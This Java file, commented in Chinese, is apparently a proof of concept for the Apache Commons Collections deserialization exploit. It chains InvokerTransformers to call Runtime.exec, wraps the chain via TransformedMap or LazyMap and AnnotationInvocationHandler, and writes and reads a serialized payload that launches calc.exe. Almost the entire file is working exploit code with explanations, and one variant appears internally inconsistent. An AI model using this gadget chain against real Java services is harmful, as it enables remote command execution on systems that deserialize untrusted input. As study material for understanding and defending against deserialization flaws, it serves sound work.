package red.silence;

/*
 核心逻辑表达式：
 ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
 主函数中：
 1、定义一个要执行的命令字符串：String commandstring = "whoami";
 2、定义一个执行逻辑：
 Transformer[] transformers = new Transformer[] {
 new ConstantTransformer(Runtime.class),
 new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime",new Class[0]}),
 new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, null})
 new InvokerTransformer("exec",new Class[] {String[].class},new Object[] {commandstring})
 }
 3、执行逻辑转化操作(ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作)：
 Transformer transformedChain = new ChainedTransformer(transformers);
 4、后面是关于不关心的东西，写死即可：
 Map<String,String> BeforeTransformerMap = new HashMap<String,String>();
 BeforeTransformerMap.put("hello", "hello");
 Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);
 Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
 Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
 ctor.setAccessible(true);
 Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
 File f = new File("temp.bin");
 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
 out.writeObject(instance);
 */

//引入必要的java包文件
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
//引入第三方包文件，也就是关于apache的那几个包

class Dest implements Serializable{
	private String name = "";

	/** 
	 * 获取：bare_field_comment
	 */
	public String getName() {
		return name;
	}

	/** 
	 * 设置：bare_field_comment
	 */
	public void setName(String name) {
		this.name = name;
	}
	
	private void readObject(ObjectInputStream in) {
		for(Map.Entry<Thread, StackTraceElement[]> entry : Thread.getAllStackTraces().entrySet()) {
			System.out.println(entry.getKey() + ":");
			
			for(StackTraceElement ele : entry.getValue()) {
				System.out.println(ele.toString());
			}
		}
		System.out.println(Thread.getAllStackTraces());
		System.out.println(in.getClass() + ":" + Thread.currentThread().getName());
	}
}
//主类
public class POC_Test implements Serializable {
	public static void main(String[] args) throws Exception {
		test2();
	}
	
	public static void test() throws IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException, ClassNotFoundException {
		 Object runtime=Class.forName("java.lang.Runtime")
	              .getMethod("getRuntime",new Class[]{})
	              .invoke(null);

	      Class.forName("java.lang.Runtime")
	              .getMethod("exec", String.class)
	              .invoke(runtime,"calc.exe");
	}
	
	public static void test3() throws IOException, ClassNotFoundException{
		Dest dest = new Dest();
		dest.setName("123");
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(baos);
		oos.writeObject(dest);
		
		ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
		ois.readObject();
	}

	public static void test2() throws Exception {
		// 定义待执行的命令:
		String commandstring = "calc.exe";
		// 定义一个反射链，确定预定的转化逻辑
		/*
		 * 定义一个反射链的方法： Transformer[] varitename = new Transformer[] { new
		 * ConstantTransformer(Runtime.class), new
		 * InvokerTransformer("getMethod",new Class[]
		 * {String.class,Class[].class},new Object[] {"getRuntime",new
		 * Class[0]}), new InvokerTransformer("invoke",new Class[]
		 * {Object.class,Object[].class},new Object[] {null, null}) new
		 * InvokerTransformer("exec",new Class[] {String[].class},new Object[]
		 * {commandstring}) }
		 */
		Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				/*
				 * 由于Method类的invoke(Object obj,Object args[])方法的定义 所以在反射内写new
				 * Class[] {Object.class, Object[].class } 正常POC流程举例：
				 * ((Runtime)Runtime
				 * .class.getMethod("getRuntime",null).invoke(null
				 * ,null)).exec("gedit");
				 */
				new InvokerTransformer("getMethod", new Class[] { String.class,
						Class[].class }, new Object[] { "getRuntime",
						new Class[0] }),
				new InvokerTransformer("invoke", new Class[] { Object.class,
						Object[].class }, new Object[] { null, null }),
				new InvokerTransformer("exec", new Class[] { String[].class },
						new Object[] { commandstring }
				// new Object[] { execArgs }
				) };

		// transformedChain:
		// ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作
		Transformer transformedChain = new ChainedTransformer(transformers);

		// BeforeTransformerMap:
		// Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict
		// Map&lt;String, String&gt; BeforeTransformerMap = new
		// HashMap&lt;String, String&gt;();
		Map<String, String> BeforeTransformerMap = new HashMap<String, String>();
		BeforeTransformerMap.put("hello", "hello");

		// Map数据结构，转换后的Map
		/*
		 * TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。 第一个参数为待转化的Map对象
		 * 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）
		 * 第三个参数为Map对象内的value要经过的转化方法。
		 */
		// TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）,
		// value的转化对象（单个或者链或者null）);
		Map AfterTransformerMap = LazyMap.decorate(BeforeTransformerMap, transformedChain);
		
		
		
		Class cl = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cl.getDeclaredConstructors()[0];
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Target.class, AfterTransformerMap);
		File f = new File("temp.bin");
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(instance);
		out.flush();
		
		out.close();
		f = new File("temp.bin");
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f));
		ois.readObject();
		
		ois.close();
	}
	
	 public static void run(){
	     Map map=new HashMap();
	     map.put("key","value");
	     //调用目标对象的toString方法
	     String command="calc.exe";
	     final String[] execArgs = new String[] { command };
	     final Transformer[] transformers = new Transformer[] {
	             new ConstantTransformer(Runtime.class),
	             new InvokerTransformer("getMethod", new Class[] {
	                     String.class, Class[].class }, new Object[] {
	                     "getRuntime", new Class[0] }),
	             new InvokerTransformer("invoke", new Class[] {
	                     Object.class, Object[].class }, new Object[] {
	                     null, new Object[0] }),
	             new InvokerTransformer("exec",
	                     new Class[] { String.class }, execArgs)
	     };
	     Transformer transformer=new ChainedTransformer(transformers);
	     Map<String, Object> transformedMap=TransformedMap.decorate(map,null,transformer);
	     for (Map.Entry<String,Object> entry:transformedMap.entrySet()){
	        entry.setValue("anything");
	     }
	 }
}

/*
 * 思路:构建BeforeTransformerMap的键值对，为其赋值，
 * 利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme
 * 对BeforeTransformerMap的value进行转换
 * ，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行
 * 
 * 执行本质:
 * ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).
 * exec(.........) 利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()
 */

